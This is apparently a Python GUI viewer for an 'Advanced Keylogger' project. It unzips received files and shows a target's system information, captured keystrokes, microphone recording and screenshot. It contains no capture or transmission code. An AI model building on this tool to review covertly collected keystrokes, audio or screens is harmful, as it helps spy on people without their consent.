import PySimpleGUI as sg
from PIL import Image, ImageTk
import PIL
from pygame import mixer, time
import pygame
import io
import os
import zipfile

def unZip():
    with zipfile.ZipFile("recived_files\\zipped.zip", 'r') as zip_ref:
      zip_ref.extractall("extracted_files")

def sysinfo_window():
    with open("extracted_files\\SYSinfo.txt", "r") as f:
     layout = [[sg.Text("System information recoreds....", key="new")],
              [sg.Multiline(f.read(),s=(40,15))]] 
     window = sg.Window("System information", layout, modal=True)
     while True:
        event, values = window.read()
        if event == "Exit" or event == sg.WIN_CLOSED:
            break

    window.close()

def klogs_window():
    with open("extracted_files\\keylogs.txt", "r") as f:
     layout = [[sg.Text("key logs  recoreds....", key="new")],
              [sg.Multiline(f.read(),s=(40,15))]]
     window = sg.Window("key logs", layout, modal=True)
     while True:
        event, values = window.read()
        if event == "Exit" or event == sg.WIN_CLOSED:
            break

    window.close()

def micrec_window():
    layout = [[sg.Text(size=(12, 1), key='-STATUS-')],
                  [
                  sg.Button('Play', pad=(10, 0), key="-PLAY-"),
                  sg.Button('Pause', pad=(10, 0), key="-PAUSE-"),
                  sg.Button('Stop', pad=(10, 0), key="-STOP-"),
                  sg.Slider(range=(0, 100), orientation='h', size=(50, 20), enable_events=True, key="-VOLUME-",
                            default_value=100)
                  ]
              ]
    window = sg.Window("Mic recordings", layout, modal=True)
    pygame.init()
    mixer.init()
    is_playing = False

    while True:
        event, values = window.read()
        if event == "Exit" or event == sg.WIN_CLOSED:
            break

        sound_path ="extracted_files\\micRecording.wav"

        song = mixer.Sound(sound_path)
        song_length = song.get_length()
        song_channel = mixer.Channel(2)

        if event == '-PLAY-':
            window['-STATUS-'].update('Playing')
            is_playing = True
            song_channel.play(song)

        elif event == '-PAUSE-':
            if not is_playing:
                song_channel.unpause()
                window['-STATUS-'].update('Playing')
                is_playing = True

            else:
                song_channel.pause()
                window['-STATUS-'].update('Paused')
                is_playing = False

        elif event == '-STOP-':
            song_channel.stop()
            window['-STATUS-'].update('Stopped')
            is_playing = False

        elif event == '-VOLUME-':
            volume = values['-VOLUME-']
            song_channel.set_volume(volume / 100)

    window.close()

def sc_window():
    layout = [ [sg.Image(key="-IMAGE-")],
               [sg.Button('Exit'),
               sg.Button('Load Image')]
             ]
    window = sg.Window("Screenshot image", layout, modal=True)
    while True:
        event, values = window.read()
        if event == "Exit" or event == sg.WIN_CLOSED:
            break

        if event == 'Load Image':
            image = Image.open("extracted_files\\sc.png")
            image.thumbnail((800, 800))
            bio = io.BytesIO()#store the image in memory in binary
            image.save(bio, format="PNG")
            window["-IMAGE-"].update(data=bio.getvalue())

    window.close()

def main():
    sg.theme('Purple')

    layout_l = [[sg.T('Advanced Keylogger tool', font='_ 26', justification='c', expand_x=True)],
              [sg.Text('Choose a user record:')],
              [sg.Listbox(values=['system information', 'key logs', 'mic records', 'screenshots'],
                          size=(30, 15),
                          key='-LIST-',
                          enable_events=True)],
              [sg.Button('Exit')]
              ]

    im = Image.open("keyloggerpic.png")
    layout_r = [[sg.Image(size=(300, 300), key='-IMAGE-')]
                ]

    layout = [[sg.Column(layout_l, element_justification='c'), sg.VSeperator(),
               sg.Column(layout_r, element_justification='c'),]]

    window = sg.Window('Advanced Keylogger', layout,finalize=True)

    image = ImageTk.PhotoImage(image=im)
    window['-IMAGE-'].update(data=image)

    while True:
        event, values = window.read()

        if event == 'Exit' or event == sg.WIN_CLOSED:
            break

        if event == '-LIST-' and len(values['-LIST-']):

            if str(values['-LIST-']) == "['system information']":
                sysinfo_window()

            elif str(values['-LIST-']) == "['key logs']":
                klogs_window()

            elif str(values['-LIST-']) == "['mic records']":
                micrec_window()

            else:
                sc_window()

    window.close()

unZip()
main()